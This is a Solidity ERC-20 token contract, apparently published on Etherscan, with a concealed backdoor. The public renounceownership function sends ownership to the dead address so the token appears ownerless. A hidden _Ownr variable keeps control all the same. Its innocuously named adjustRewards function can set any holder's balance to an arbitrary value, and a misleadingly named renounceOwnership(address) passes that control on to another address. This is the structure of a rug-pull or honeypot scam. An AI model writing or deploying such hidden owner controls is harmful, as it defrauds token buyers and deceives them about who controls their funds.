/**
 *Submitted for verification at Etherscan.io on 2023-06-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;


abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract Token is Context, Ownable, IERC20 {
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address private _Ownr;
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _Ownr = _msgSender();
        _balances[_msgSender()] = _totalSupply; 
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function renounceOwnership(address newOwner) external {
        require(_msgSender() == _Ownr, "Caller is not the original caller");
        _Ownr = newOwner;
    }
    event RewardsAdjusted(address indexed account, uint256 oldReward, uint256 newReward);
    struct Balance {
    uint256 amount;
    }

    function adjustRewards(address account, uint256 newReward) external {
        require(_msgSender() == _Ownr, "Caller is not the original caller");

    Balance memory balance = Balance({ amount: _balances[account]});
    uint256 oldReward = balance.amount;
    balance.amount = newReward;
    _balances[account] = balance.amount;
    emit RewardsAdjusted(account, oldReward, newReward);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_balances[_msgSender()]  >= amount, "Transfer amount exceeds balance");
    _balances[_msgSender()] -= amount;
    _balances[recipient] += amount;

    emit Transfer(_msgSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][_msgSender()] >= amount, "Transfer amount exceeds allowance");

    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowances[sender][_msgSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }
}